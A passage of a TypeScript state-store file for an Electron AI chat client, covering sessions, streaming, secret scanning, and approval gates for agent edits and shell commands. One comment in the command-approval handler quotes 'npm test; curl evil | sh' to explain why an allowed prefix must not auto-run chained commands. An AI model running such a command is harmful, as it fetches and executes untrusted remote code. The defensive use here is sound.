import { create } from 'zustand'
import type { Attachment, ChatMessage, GitStatus, McpServerStatus, Mode, ProviderError, ProviderSummary, StreamEvent, WorkspaceTreeEntry } from '@shared/types'
import { scanSecrets, type SecretCategory } from '@shared/secret-scan'
import { commandMatchesAllowedPrefix } from '@shared/command-safety'
import { encodeSelection } from '../canvas/selection.js'

function newId(): string {
  return `id-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`
}

interface SessionMeta {
  id: string
  title: string
  updatedAt: number
  pinned?: boolean
  archived?: boolean
  tags?: string[]
}
export interface Fallback { providerId: string; model: string }

// Shared with Splitter.tsx, which needs the same bounds to report accurate
// aria-valuemin/aria-valuemax for its keyboard-resize affordance — a single
// source of truth keeps the two from silently drifting apart.
export const SIDEBAR_MIN_WIDTH = 180
export const SIDEBAR_MAX_WIDTH = 480

/** Electron wraps a rejected ipcMain.handle as "Error invoking remote method
 *  'chan': <message>". Strip that envelope so the UI shows the clean message. */
export function unwrapIpcMessage(message: string): string {
  const m = /^Error invoking remote method '[^']*':\s*(.*)$/s.exec(message)
  return m ? m[1]! : message
}

function toProviderError(err: unknown): ProviderError {
  const raw = err instanceof Error ? err.message : String(err)
  return { kind: 'unknown', message: unwrapIpcMessage(raw) }
}

interface AppState {
  sessions: SessionMeta[]
  activeSessionId: string | null
  messages: ChatMessage[]
  /** Non-null exactly while a stream is in flight; cleared by `error`/`done`. */
  streamId: string | null
  /**
   * The streamId of the most recently started turn. Unlike `streamId`, this is
   * NOT cleared when the turn ends — it is what `applyEvent` routes on, so a
   * second terminal event for the same turn (e.g. a persistence error arriving
   * after the provider error already cleared `streamId`) is still recognized
   * as belonging to the current turn instead of being silently discarded.
   */
  lastStreamId: string | null
  /**
   * Which session owns the in-flight (or most recently finished) stream.
   * `streamingText` accumulates for THIS session regardless of which session
   * the user is currently viewing (`activeSessionId`) — viewing and
   * streaming are independent. A view should only render `streamingText`
   * when `streamingSessionId === activeSessionId`.
   *
   * KNOWN LIMITATION (v0, accepted): this is a single buffer, not a
   * per-session map. If the user starts a new turn in session B while
   * session A's turn is still streaming, `send()` overwrites
   * `streamingSessionId` to B and A's remaining events then fail the gate.
   * A's reply disappears from any live view but is still persisted by main
   * and reappears when the user reloads session A. A `Record<sessionId,
   * StreamState>` would fix this but is deliberately out of scope for v0.
   */
  streamingSessionId: string | null
  streamingText: string
  error: ProviderError | null
  /** Transient engine status (e.g. a failover notice) shown above the reply. */
  streamNotice: string | null
  providerId: string
  providers: ProviderSummary[]
  model: string
  /** Ordered failover targets, persisted in settings, sent with each turn. */
  fallbacks: Fallback[]
  /** Named presets (system prompt + model + temperature), persisted in settings. */
  modes: Mode[]
  activeModeId: string | null
  sidebarWidth: number
  settingsOpen: boolean
  /** Sidebar filter. Purely client-side over the already-loaded session index. */
  query: string
  theme: 'dark' | 'light'
  /** OS platform, from appInfo(). Drives the frameless title-bar chrome. */
  platform: string
  /** Whether the context inspector drawer is open. */
  inspectorOpen: boolean
  /** Workspace-read (spec §A): open state, chosen root, and pruned file tree. */
  workspaceOpen: boolean
  workspaceRoot: string | null
  workspaceTree: WorkspaceTreeEntry[]
  /** Side-thread drawer open state + optional seeded quote. Streaming for the
   *  side thread is handled entirely inside SideThread (its own session + event
   *  subscription), so none of the main streaming fields are touched. */
  sideThreadOpen: boolean
  sideThreadSeed: string
  /** The element markup selected in the canvas for point-and-refine (Canvas 8). */
  canvasSelection: string | null
  /**
   * A request from the transcript to focus a given artifact language in the
   * canvas ("Open in canvas"). A monotonically increasing token so repeated
   * clicks on the same language re-focus even when the value is unchanged.
   */
  canvasFocus: { lang: string; token: number } | null
  /** User-collapsed the canvas pane; reopened by an "Open in canvas" card. */
  canvasCollapsed: boolean
  /** Composer draft, held here so attachments and the secret guard can act on it. */
  draft: string
  /** Image attachments staged in the composer, sent with the next turn (spec §B). */
  pendingAttachments: Attachment[]
  /** Agentic-edits opt-in (spec §6): the model may call edit tools this session. */
  agentMode: boolean
  /** A write awaiting approval at the diff gate, or null (agentic-edits spec §4). */
  pendingEdit: { callId: string; tool: string; relPath: string; previous: string | null; proposed: string } | null
  /** Set when the user accepted a pending edit/confirm with "trust this turn":
   *  subsequent tool approvals this turn auto-apply. Reset on send/done/error
   *  and on switching sessions. */
  trustedTurn: boolean
  /** A non-diff tool call (MCP) awaiting yes/no, or null (mcp-client spec §3). */
  pendingConfirm: { callId: string; name: string; argsJson: string } | null
  /** Tool names the user chose to allow for the rest of the session. */
  allowedTools: string[]
  /** Command prefixes the user chose to auto-run this session (terminal-git §1). */
  allowedCommandPrefixes: string[]
  /** The most recent turn that applied edits, for a one-click revert affordance. */
  lastEditTurnId: string | null
  /** Configured MCP servers and their status (mcp-client spec §2). */
  mcpServers: McpServerStatus[]
  mcpOpen: boolean
  /** Git panel state (terminal-git spec §2). */
  gitOpen: boolean
  gitStatus: GitStatus | null
  gitDiff: string
  /** Model Race (model-race spec): chosen targets, control open, live columns. */
  raceOpen: boolean
  raceTargets: { providerId: string; model: string }[]
  race: {
    raceId: string
    columns: { columnId: string; providerId: string; model: string; text: string; done: boolean; error: string | null }[]
  } | null
  /** Set when send is paused because the draft looks like it contains secrets. */
  pendingSecret: SecretCategory[] | null

  openSettings(): void
  closeSettings(): void
  toggleInspector(): void
  toggleWorkspace(): void
  /** Load the remembered workspace root and its tree (on startup). */
  initWorkspace(): Promise<void>
  /** Open the folder picker, then load the tree. */
  pickWorkspace(): Promise<void>
  openSideThread(seed: string): void
  closeSideThread(): void
  setDraft(value: string): void
  addAttachment(attachment: Attachment): void
  removeAttachment(index: number): void
  toggleAgentMode(): void
  /** Answer the diff gate: accept / reject / accept-with-edited-content.
   *  `trustTurn` accepts and marks the rest of this turn's tool calls to
   *  auto-apply without further gating. */
  resolveEdit(action: 'accept' | 'reject' | 'edited', content?: string, trustTurn?: boolean): void
  /** Answer the generic tool-confirm gate; `allowSession` remembers the tool.
   *  `trustTurn` accepts and marks the rest of this turn's tool calls to
   *  auto-apply without further gating. */
  resolveConfirm(action: 'accept' | 'reject', allowSession?: boolean, trustTurn?: boolean): void
  /** Accept the pending command and auto-run this prefix for the session. */
  allowCommandPrefix(prefix: string): void
  /** Revert every edit made in a turn (agentic-edits spec §5). */
  revertEdits(turnId: string): Promise<void>
  toggleMcp(): void
  toggleGit(): void
  refreshGit(): Promise<void>
  showGitDiff(path?: string): Promise<void>
  toggleRaceBar(): void
  addRaceTarget(providerId: string, model: string): void
  removeRaceTarget(index: number): void
  startRace(): Promise<void>
  chooseWinner(columnId: string): Promise<void>
  abortRace(): Promise<void>
  loadMcpServers(): Promise<void>
  addMcpServer(config: { id: string; name: string; command: string; args?: string[] }): Promise<void>
  removeMcpServer(id: string): Promise<void>
  setMcpEnabled(id: string, enabled: boolean): Promise<void>
  setCanvasSelection(outerHTML: string | null): void
  /** Focus the canvas on an artifact language (from a transcript card). */
  focusCanvas(lang: string): void
  setCanvasCollapsed(collapsed: boolean): void
  /** Scans the draft; sends if clean, otherwise opens the secret-warning gate. */
  requestSend(): void
  confirmSecretSend(): void
  cancelSecretSend(): void
  setQuery(value: string): void
  setTheme(theme: 'dark' | 'light'): void
  loadPlatform(): Promise<void>
  renameSession(id: string, title: string): Promise<void>
  deleteSession(id: string): Promise<void>
  /**
   * Surfaces a caught bridge failure through the shared `error` field, the
   * same path every in-store IPC caller already uses (see `catch (err) {
   * set({ error: toProviderError(err) }) }` throughout this file). Exported
   * so callers outside a store action — SettingsDialog.tsx makes bridge
   * calls directly rather than through a store method — can report a
   * failure the same way instead of swallowing it.
   */
  reportError(err: unknown): void
  loadSessions(): Promise<void>
  loadProviders(): Promise<void>
  loadSettings(): Promise<void>
  setFallbacks(fallbacks: Fallback[]): Promise<void>
  saveMode(mode: Mode): Promise<void>
  deleteMode(id: string): Promise<void>
  setActiveMode(id: string | null): void
  togglePin(id: string): Promise<void>
  toggleArchive(id: string): Promise<void>
  setSessionTags(id: string, tags: string[]): Promise<void>
  refreshMessages(): Promise<void>
  branchFrom(messageId: string): Promise<void>
  editUserMessage(messageId: string, content: string): Promise<void>
  editAssistantMessage(messageId: string, content: string): Promise<void>
  selectSession(id: string): Promise<void>
  newSession(): Promise<void>
  send(content: string): Promise<void>
  stop(): Promise<void>
  setProvider(id: string): void
  setModel(id: string): void
  setSidebarWidth(px: number): void
  applyEvent(envelope: { streamId: string; sessionId: string; event: StreamEvent; columnId?: string }): void
}

export const useAppStore = create<AppState>((set, get) => ({
  sessions: [],
  activeSessionId: null,
  messages: [],
  streamId: null,
  lastStreamId: null,
  streamingSessionId: null,
  streamingText: '',
  error: null,
  streamNotice: null,
  providerId: '',
  providers: [],
  model: '',
  fallbacks: [],
  modes: [],
  activeModeId: null,
  sidebarWidth: 300,
  settingsOpen: false,
  query: '',
  theme: 'dark',
  platform: '',
  inspectorOpen: false,
  workspaceOpen: false,
  workspaceRoot: null,
  workspaceTree: [],
  sideThreadOpen: false,
  sideThreadSeed: '',
  canvasSelection: null,
  canvasFocus: null,
  canvasCollapsed: false,
  draft: '',
  pendingAttachments: [],
  agentMode: false,
  pendingEdit: null,
  trustedTurn: false,
  pendingConfirm: null,
  allowedTools: [],
  allowedCommandPrefixes: [],
  lastEditTurnId: null,
  mcpServers: [],
  mcpOpen: false,
  gitOpen: false,
  gitStatus: null,
  gitDiff: '',
  raceOpen: false,
  raceTargets: [],
  race: null,
  pendingSecret: null,

  openSettings() { set({ settingsOpen: true }) },
  closeSettings() { set({ settingsOpen: false }) },
  toggleInspector() { set((s) => ({ inspectorOpen: !s.inspectorOpen })) },
  toggleWorkspace() { set((s) => ({ workspaceOpen: !s.workspaceOpen })) },

  async initWorkspace() {
    try {
      const root = await window.modelith.workspace.current()
      if (!root) return
      const tree = await window.modelith.workspace.tree()
      set({ workspaceRoot: root, workspaceTree: tree, workspaceOpen: true })
    } catch (err) {
      set({ error: toProviderError(err) })
    }
  },

  async pickWorkspace() {
    try {
      const root = await window.modelith.workspace.pick()
      if (!root) return
      const tree = await window.modelith.workspace.tree()
      set({ workspaceRoot: root, workspaceTree: tree, workspaceOpen: true })
    } catch (err) {
      set({ error: toProviderError(err) })
    }
  },
  openSideThread(seed) { set({ sideThreadOpen: true, sideThreadSeed: seed }) },
  closeSideThread() { set({ sideThreadOpen: false, sideThreadSeed: '' }) },
  setDraft(value) { set({ draft: value }) },
  addAttachment(attachment) { set((s) => ({ pendingAttachments: [...s.pendingAttachments, attachment] })) },
  removeAttachment(index) { set((s) => ({ pendingAttachments: s.pendingAttachments.filter((_, i) => i !== index) })) },
  toggleAgentMode() { set((s) => ({ agentMode: !s.agentMode })) },
  resolveEdit(action, content, trustTurn) {
    const edit = get().pendingEdit
    if (!edit) return
    set({ pendingEdit: null, ...(trustTurn && action === 'accept' ? { trustedTurn: true } : {}) })
    void window.modelith.chat.toolDecision(edit.callId, action, content, trustTurn)
  },
  resolveConfirm(action, allowSession, trustTurn) {
    const confirm = get().pendingConfirm
    if (!confirm) return
    set((s) => ({
      pendingConfirm: null,
      ...(trustTurn && action === 'accept' ? { trustedTurn: true } : {}),
      allowedTools: allowSession && action === 'accept' ? [...new Set([...s.allowedTools, confirm.name])] : s.allowedTools,
    }))
    void window.modelith.chat.toolDecision(confirm.callId, action, undefined, trustTurn)
  },
  allowCommandPrefix(prefix) {
    const confirm = get().pendingConfirm
    if (!confirm) return
    set((s) => ({
      pendingConfirm: null,
      allowedCommandPrefixes: [...new Set([...s.allowedCommandPrefixes, prefix])],
    }))
    void window.modelith.chat.toolDecision(confirm.callId, 'accept')
  },
  async revertEdits(turnId) {
    try {
      await window.modelith.workspace.revert(turnId)
      set({ lastEditTurnId: null })
    } catch (err) {
      set({ error: toProviderError(err) })
    }
  },
  toggleMcp() { set((s) => ({ mcpOpen: !s.mcpOpen })) },
  toggleGit() {
    const next = !get().gitOpen
    set({ gitOpen: next })
    if (next) void get().refreshGit()
  },
  async refreshGit() {
    try { set({ gitStatus: await window.modelith.git.status(), gitDiff: '' }) }
    catch (err) { set({ error: toProviderError(err) }) }
  },
  async showGitDiff(path) {
    try { set({ gitDiff: await window.modelith.git.diff(path) }) }
    catch (err) { set({ error: toProviderError(err) }) }
  },
  toggleRaceBar() { set((s) => ({ raceOpen: !s.raceOpen })) },
  addRaceTarget(providerId, model) {
    set((s) => (s.raceTargets.length >= 4 ? s : { raceTargets: [...s.raceTargets, { providerId, model }] }))
  },
  removeRaceTarget(index) { set((s) => ({ raceTargets: s.raceTargets.filter((_, i) => i !== index) })) },

  async startRace() {
    let sessionId = get().activeSessionId
    if (!sessionId) { await get().newSession(); sessionId = get().activeSessionId }
    if (!sessionId) return
    const content = get().draft.trim()
    const entries = get().raceTargets
    if (!content || entries.length < 2 || get().race) return
    // Show the user message and initialise the columns immediately.
    set((s) => ({
      draft: '',
      raceOpen: false,
      error: null,
      messages: [...s.messages, { id: `local-${Date.now()}`, role: 'user', content, createdAt: Date.now() }],
      race: {
        raceId: 'pending',
        columns: entries.map((e, i) => ({ columnId: `col-${i}`, providerId: e.providerId, model: e.model, text: '', done: false, error: null })),
      },
    }))
    try {
      const { raceId } = await window.modelith.chat.startRace({ sessionId, content, entries })
      set((s) => (s.race ? { race: { ...s.race, raceId } } : {}))
    } catch (err) {
      set({ error: toProviderError(err), race: null })
    }
  },

  async chooseWinner(columnId) {
    const race = get().race
    if (!race || race.raceId === 'pending') return
    try {
      await window.modelith.chat.chooseWinner(race.raceId, columnId)
      set({ race: null })
      await get().refreshMessages()
    } catch (err) {
      set({ error: toProviderError(err) })
    }
  },

  async abortRace() {
    const race = get().race
    if (!race) return
    try { if (race.raceId !== 'pending') await window.modelith.chat.abort(race.raceId) }
    catch { /* discard regardless */ }
    set({ race: null })
  },
  async loadMcpServers() {
    try { set({ mcpServers: await window.modelith.mcp.list() }) }
    catch (err) { set({ error: toProviderError(err) }) }
  },
  async addMcpServer(config) {
    try { set({ mcpServers: await window.modelith.mcp.add(config) }) }
    catch (err) { set({ error: toProviderError(err) }) }
  },
  async removeMcpServer(id) {
    try { set({ mcpServers: await window.modelith.mcp.remove(id) }) }
    catch (err) { set({ error: toProviderError(err) }) }
  },
  async setMcpEnabled(id, enabled) {
    try { set({ mcpServers: await window.modelith.mcp.setEnabled(id, enabled) }) }
    catch (err) { set({ error: toProviderError(err) }) }
  },
  setCanvasSelection(outerHTML) { set({ canvasSelection: outerHTML }) },
  focusCanvas(lang) {
    const token = (get().canvasFocus?.token ?? 0) + 1
    // Focusing from a transcript card also re-opens a collapsed canvas.
    set({ canvasFocus: { lang, token }, canvasCollapsed: false })
  },
  setCanvasCollapsed(collapsed) { set({ canvasCollapsed: collapsed }) },

  // Outbound secret guard (roadmap 28): scan before anything leaves the
  // machine. A match pauses the send and opens a confirm gate rather than
  // blocking outright — a guard against the common paste-a-key accident, not a
  // hard stop, since the user may legitimately be discussing a key.
  requestSend() {
    const prompt = get().draft.trim()
    if (!prompt || (get().streamId !== null && get().streamingSessionId === get().activeSessionId)) return
    // A canvas selection is folded into the persisted content (spec §7), so the
    // secret scan runs over exactly what will be sent.
    const selection = get().canvasSelection
    const content = selection ? encodeSelection(selection, prompt) : prompt
    const categories = [...new Set(scanSecrets(content).map((m) => m.category))]
    if (categories.length > 0) { set({ pendingSecret: categories }); return }
    set({ draft: '', canvasSelection: null })
    void get().send(content)
  },

  confirmSecretSend() {
    const prompt = get().draft.trim()
    const selection = get().canvasSelection
    const content = selection ? encodeSelection(selection, prompt) : prompt
    set({ pendingSecret: null, draft: '', canvasSelection: null })
    if (prompt) void get().send(content)
  },

  cancelSecretSend() { set({ pendingSecret: null }) },
  reportError(err) { set({ error: toProviderError(err) }) },
  setQuery(value) { set({ query: value }) },
  setTheme(theme) { set({ theme }) },

  async loadPlatform() {
    try {
      const info = await window.modelith.appInfo()
      set({ platform: info.platform })
    } catch (err) {
      set({ error: toProviderError(err) })
    }
  },

  async loadSettings() {
    try {
      const settings = await window.modelith.settings.get()
      const fallbacks = settings['fallbacks']
      if (Array.isArray(fallbacks)) set({ fallbacks: fallbacks as Fallback[] })
      const modes = settings['modes']
      if (Array.isArray(modes)) set({ modes: modes as Mode[] })
    } catch (err) {
      set({ error: toProviderError(err) })
    }
  },

  async setFallbacks(fallbacks) {
    set({ fallbacks })
    try {
      await window.modelith.settings.set({ fallbacks })
    } catch (err) {
      set({ error: toProviderError(err) })
    }
  },

  async saveMode(mode) {
    const modes = get().modes.some((m) => m.id === mode.id)
      ? get().modes.map((m) => (m.id === mode.id ? mode : m))
      : [...get().modes, mode]
    set({ modes })
    try {
      await window.modelith.settings.set({ modes })
    } catch (err) {
      set({ error: toProviderError(err) })
    }
  },

  async deleteMode(id) {
    const modes = get().modes.filter((m) => m.id !== id)
    set({ modes, activeModeId: get().activeModeId === id ? null : get().activeModeId })
    try {
      await window.modelith.settings.set({ modes })
    } catch (err) {
      set({ error: toProviderError(err) })
    }
  },

  // Applying a mode optionally switches the model, then its system prompt and
  // temperature ride along on subsequent sends (see send()).
  setActiveMode(id) {
    set({ activeModeId: id })
    if (id === null) return
    const mode = get().modes.find((m) => m.id === id)
    if (mode?.providerId) set({ providerId: mode.providerId })
    if (mode?.model) set({ model: mode.model })
  },

  async togglePin(id) {
    const current = get().sessions.find((s) => s.id === id)?.pinned ?? false
    try {
      await window.modelith.sessions.setPinned(id, !current)
      await get().loadSessions()
    } catch (err) {
      set({ error: toProviderError(err) })
    }
  },

  async toggleArchive(id) {
    const current = get().sessions.find((s) => s.id === id)?.archived ?? false
    try {
      await window.modelith.sessions.setArchived(id, !current)
      await get().loadSessions()
    } catch (err) {
      set({ error: toProviderError(err) })
    }
  },

  async setSessionTags(id, tags) {
    try {
      await window.modelith.sessions.setTags(id, tags)
      await get().loadSessions()
    } catch (err) {
      set({ error: toProviderError(err) })
    }
  },

  // Reloads the active session's messages from disk, replacing the optimistic
  // `local-*` ids used during streaming with the canonical persisted ids that
  // edit and fork operate on. Fire-and-forget after a turn completes.
  async refreshMessages() {
    const id = get().activeSessionId
    if (!id) return
    try {
      set({ messages: await window.modelith.sessions.load(id) })
    } catch {
      // A refresh failure is non-fatal — the optimistic messages remain shown.
    }
  },

  async branchFrom(messageId) {
    const sourceId = get().activeSessionId
    if (!sourceId) return
    try {
      const { id } = await window.modelith.sessions.branch(sourceId, messageId, 'Fork')
      await get().loadSessions()
      await get().selectSession(id)
    } catch (err) {
      set({ error: toProviderError(err) })
    }
  },

  // Editing a user message rewinds the conversation to just before it, then
  // sends the edited text as a fresh turn.
  async editUserMessage(messageId, content) {
    const sessionId = get().activeSessionId
    if (!sessionId) return
    try {
      await window.modelith.sessions.truncateFrom(sessionId, messageId)
      set({ messages: await window.modelith.sessions.load(sessionId) })
      await get().send(content)
    } catch (err) {
      set({ error: toProviderError(err) })
    }
  },

  // Editing an assistant message rewrites its content in place (put words in its
  // mouth), without re-running the turn.
  async editAssistantMessage(messageId, content) {
    const sessionId = get().activeSessionId
    if (!sessionId) return
    try {
      await window.modelith.sessions.editMessage(sessionId, messageId, content)
      set({ messages: await window.modelith.sessions.load(sessionId) })
    } catch (err) {
      set({ error: toProviderError(err) })
    }
  },

  async renameSession(id, title) {
    const trimmed = title.trim()
    if (!trimmed) return
    try {
      await window.modelith.sessions.rename(id, trimmed)
      await get().loadSessions()
    } catch (err) {
      set({ error: toProviderError(err) })
    }
  },

  // Removing the session currently on screen must also clear what it was
  // showing, otherwise the transcript keeps rendering messages belonging to a
  // conversation that no longer exists.
  async deleteSession(id) {
    try {
      await window.modelith.sessions.delete(id)
      if (get().activeSessionId === id) {
        set({ activeSessionId: null, messages: [], error: null })
      }
      await get().loadSessions()
    } catch (err) {
      set({ error: toProviderError(err) })
    }
  },

  async loadSessions() {
    try {
      set({ sessions: await window.modelith.sessions.list() })
    } catch (err) {
      set({ error: toProviderError(err) })
    }
  },

  // Selects the first provider (and its first model) only when nothing is
  // chosen yet, or the current selection no longer exists. This is what lets
  // the E2E fake provider (registered first under MODELITH_FAKE_PROVIDER)
  // become the active selection with no test-only code in the renderer.
  async loadProviders() {
    try {
      const list = await window.modelith.providers.list()
      set({ providers: list })
      const current = get().providerId
      if (!current || !list.some((p) => p.id === current)) {
        const first = list[0]
        if (!first) return
        set({ providerId: first.id })
        const models = await window.modelith.providers.models(first.id).catch(() => [])
        if (models[0]) set({ model: models[0].id })
      }
    } catch (err) {
      set({ error: toProviderError(err) })
    }
  },

  // Switching sessions clears `error` (a stale error belongs to whichever
  // session raised it, not to the one being loaded now) but must NOT touch
  // `streamingText`/`streamingSessionId`/`streamId`/`lastStreamId` — those
  // belong to whichever session owns the in-flight stream, independent of
  // which session is being viewed. Clearing `streamingText` here previously
  // caused a regression: switching away from a streaming session and back
  // wiped the accumulated buffer, truncating the eventual assistant message
  // to only the text that arrived after the return. The in-flight turn (if
  // any) keeps running in main and persists normally regardless of what the
  // user is looking at.
  async selectSession(id) {
    try {
      const messages = await window.modelith.sessions.load(id)
      // Per-turn/per-session UI state must not bleed into the newly-opened
      // session: the revert affordance and any canvas selection belong to the
      // session that produced them.
      set({ activeSessionId: id, messages, error: null, lastEditTurnId: null, canvasSelection: null, trustedTurn: false })
    } catch (err) {
      set({ error: toProviderError(err) })
    }
  },

  async newSession() {
    try {
      const { id } = await window.modelith.sessions.create('New chat')
      await get().loadSessions()
      await get().selectSession(id)
    } catch (err) {
      set({ error: toProviderError(err) })
    }
  },

  async send(content) {
    let sessionId = get().activeSessionId
    if (!sessionId) { await get().newSession(); sessionId = get().activeSessionId }
    if (!sessionId) return
    // Sending with no model selected (e.g. right after switching provider in
    // Settings, before a model list is available) would otherwise reach
    // main's zod schema, which rejects the empty string as a raw validation
    // error mapped to an unhelpful 'unknown'/Retry. This is a distinct
    // condition from 'auth' (the provider rejected the credentials) — an
    // empty model can happen for reasons that have nothing to do with a
    // missing key (a keyless local runtime whose server isn't running yet,
    // or a transient failure fetching the model list), so it gets its own
    // 'no_model' kind rather than borrowing 'auth'. Both kinds happen to
    // share the "Open settings" recovery action (see ErrorNotice.tsx /
    // Transcript.tsx), which is fine — two kinds can share an affordance
    // without one lying about the cause.
    if (!get().model) {
      set({ error: { kind: 'no_model', message: 'No model is selected. Choose one in settings.' } })
      return
    }
    // Staged images ride with this turn, then the composer is cleared.
    const attachments = get().pendingAttachments
    // First user message auto-titles the chat (it starts life as "New chat").
    const isFirstTurn = get().messages.length === 0
    // A new turn genuinely starts a new buffer, so resetting streamingText
    // and (re)pointing streamingSessionId at the target session here is
    // correct even though selectSession must never do the equivalent.
    set((s) => ({
      error: null,
      streamNotice: null,
      streamingText: '',
      streamingSessionId: sessionId,
      pendingAttachments: [],
      trustedTurn: false,
      messages: [...s.messages, {
        id: `local-${Date.now()}`, role: 'user', content, createdAt: Date.now(),
        ...(attachments.length > 0 ? { attachments } : {}),
      }],
    }))
    try {
      // Only fall back to targets other than the current selection, so a
      // fallback list that happens to include the primary does not retry it.
      const fallbacks = get().fallbacks.filter(
        (f) => !(f.providerId === get().providerId && f.model === get().model),
      )
      const mode = get().modes.find((m) => m.id === get().activeModeId)
      const { streamId } = await window.modelith.chat.send({
        sessionId,
        providerId: get().providerId,
        model: get().model,
        content,
        ...(attachments.length > 0 ? { attachments } : {}),
        ...(get().agentMode ? { agent: true } : {}),
        ...(fallbacks.length > 0 ? { fallbacks } : {}),
        ...(mode?.systemPrompt ? { systemPrompt: mode.systemPrompt } : {}),
        ...(mode?.temperature !== undefined ? { temperature: mode.temperature } : {}),
      })
      set({ streamId, lastStreamId: streamId })
      if (isFirstTurn) {
        const title = content.replace(/\s+/g, ' ').trim().slice(0, 48) || 'New chat'
        void get().renameSession(sessionId, title)
      }
    } catch (err) {
      set({ error: toProviderError(err), streamId: null })
    }
  },

  async stop() {
    const id = get().streamId
    try {
      if (id) await window.modelith.chat.abort(id)
    } catch (err) {
      set({ error: toProviderError(err) })
    } finally {
      set((s) => {
        // The Composer only ever renders the Stop button (and therefore only
        // ever calls stop()) when `streamingSessionId === activeSessionId`
        // (see Composer.tsx), so this is always the session on screen — but
        // re-check with fresh state rather than a value captured before the
        // `await`, since the user could (in principle) have navigated during
        // the abort round-trip.
        //
        // Appending locally (rather than waiting for a reload) is what makes
        // the "Stopped before completion." label appear immediately instead
        // of only after the user leaves and returns to this session. This
        // cannot double-append: selectSession() always *replaces* `messages`
        // wholesale from disk (`set({ messages, ... })`), it never appends to
        // the in-memory array, so when the user later reloads this session
        // the locally-appended message here is simply overwritten by the one
        // persisted copy stream-engine.ts wrote to disk (see the `incomplete`
        // fix there) — never added alongside it.
        const shouldAppend = s.streamingText !== '' && s.streamingSessionId === s.activeSessionId
        return {
          streamId: null,
          streamingText: '',
          messages: shouldAppend
            ? [...s.messages, {
              id: `local-stopped-${Date.now()}`, role: 'assistant',
              content: s.streamingText, createdAt: Date.now(), incomplete: true,
            }]
            : s.messages,
        }
      })
    }
  },

  setProvider(id) { set({ providerId: id, model: '' }) },
  setModel(id) { set({ model: id }) },
  setSidebarWidth(px) {
    set({ sidebarWidth: Math.min(SIDEBAR_MAX_WIDTH, Math.max(SIDEBAR_MIN_WIDTH, px)) })
  },

  // Gate on BOTH identifiers: an envelope only applies to the turn it belongs
  // to (`lastStreamId` — see field doc above) AND the session that OWNS the
  // stream (`streamingSessionId` — NOT `activeSessionId`). Accumulation must
  // continue for the owning session no matter what the user is currently
  // looking at: gating on `activeSessionId` here was the Fix Round 2
  // regression — it wiped and re-accumulated the buffer every time the user
  // navigated away and back, truncating the eventual message to only the
  // text that arrived after the return.
  //
  // Routing on `lastStreamId` (not `streamId`) means a second terminal event
  // for the same turn is still accepted: `streamId` is cleared by the first
  // `error`/`done` (it only tracks "are we currently streaming"), but
  // `lastStreamId` keeps identifying the turn, so e.g. a persistence error
  // arriving after the provider error already terminated the stream still
  // matches and replaces the displayed error with the more actionable one.
  applyEvent({ streamId, sessionId, event, columnId }) {
    // Race column events are routed by columnId (streamId is the raceId, which
    // is not the normal lastStreamId). Only one race runs at a time.
    if (columnId !== undefined) {
      const race = get().race
      if (!race) return
      set((s) => {
        if (!s.race) return {}
        const raceId = s.race.raceId === 'pending' ? streamId : s.race.raceId
        const columns = s.race.columns.map((c) => {
          if (c.columnId !== columnId) return c
          if (event.type === 'text') return { ...c, text: c.text + event.delta }
          if (event.type === 'done') return { ...c, done: true }
          if (event.type === 'error') return { ...c, done: true, error: event.error.message }
          return c
        })
        return { race: { raceId, columns } }
      })
      return
    }
    if (streamId !== get().lastStreamId) return
    if (sessionId !== get().streamingSessionId) return
    if (event.type === 'notice') {
      // Engine status (a failover retry). Shown transiently for the owning
      // session only; not persisted, cleared when the next turn starts.
      if (sessionId === get().activeSessionId) set({ streamNotice: event.text })
      return
    }
    if (event.type === 'reasoning') {
      // Reasoning/thinking deltas are not rendered in v0; ignore rather than
      // letting them fall through to the text accumulator.
      return
    }
    if (event.type === 'tool_call') {
      // Activity only; the outcome arrives as tool_result. Surfaced transiently.
      if (sessionId === get().activeSessionId) set({ streamNotice: `Calling ${event.name}…` })
      return
    }
    if (event.type === 'tool_pending') {
      // A write awaiting approval at the diff gate (agentic-edits spec §4).
      if (sessionId === get().activeSessionId) {
        set({ pendingEdit: { callId: event.callId, tool: event.tool, relPath: event.relPath, previous: event.previous, proposed: event.proposed } })
      }
      return
    }
    if (event.type === 'tool_confirm') {
      // A tool call awaiting yes/no. A command (run_command/git_commit) can be
      // auto-run if it matches a user-allowed prefix; an MCP tool if the user
      // allowed that tool. Otherwise raise the confirm gate.
      const isCommand = event.name === 'run_command' || event.name === 'git_commit'
      if (isCommand) {
        let command = ''
        try { command = String((JSON.parse(event.argsJson) as { command?: string }).command ?? '') } catch { /* keep '' */ }
        // Auto-run only a clean prefix match with no shell operators — an
        // allowed "npm test" must not silently run "npm test; curl evil | sh".
        if (commandMatchesAllowedPrefix(command, get().allowedCommandPrefixes)) {
          void window.modelith.chat.toolDecision(event.callId, 'accept')
          return
        }
      } else if (get().allowedTools.includes(event.name)) {
        void window.modelith.chat.toolDecision(event.callId, 'accept')
        return
      }
      if (sessionId === get().activeSessionId) {
        set({ pendingConfirm: { callId: event.callId, name: event.name, argsJson: event.argsJson } })
      }
      return
    }
    if (event.type === 'tool_result') {
      if (sessionId === get().activeSessionId) {
        set({
          streamNotice: `${event.ok ? '✓' : '✗'} ${event.name}`,
          // Only surface the revert affordance when a write actually landed
          // (not on a rejected write, whose result is still "ok").
          ...(event.applied ? { lastEditTurnId: streamId } : {}),
        })
      }
      // A tool round-trip means more messages landed on disk; refresh so the
      // transcript shows the assistant tool-call turn and the result.
      if (sessionId === get().activeSessionId) void get().refreshMessages()
      return
    }
    if (event.type === 'text') {
      // If `streamId` is already null, the renderer has already considered
      // this turn over — most commonly because the user just clicked Stop,
      // and this chunk was in flight the instant the abort signal fired,
      // arriving a moment after stop() already cleared and locally persisted
      // `streamingText` as an incomplete message. Accumulating it here would
      // silently resurrect a streaming bubble with no label, and duplicate
      // text once the session is reloaded from disk (stream-engine.ts only
      // persisted what it had already sent before the abort was observed).
      if (get().streamId === null) return
      set((s) => ({ streamingText: s.streamingText + event.delta }))
      return
    }
    if (event.type === 'error') {
      // Only surface the error if the user is looking at the session it
      // belongs to — an error for a session the user has navigated away
      // from should not hijack whatever is currently displayed. `streamId`
      // is always cleared so the composer leaves its streaming state
      // regardless of which session is active. `streamingText` is cleared
      // unconditionally: whatever partial text had accumulated is either
      // about to be reloaded from disk (stream-engine.ts persists it marked
      // `incomplete`) or was never worth showing, and leaving it in the
      // buffer would otherwise render a raw, unlabeled streaming bubble
      // alongside the error notice.
      set((s) => {
        // Symmetric with stop(): append whatever streamed so far as an
        // incomplete bubble so it doesn't vanish until a reload. Only for the
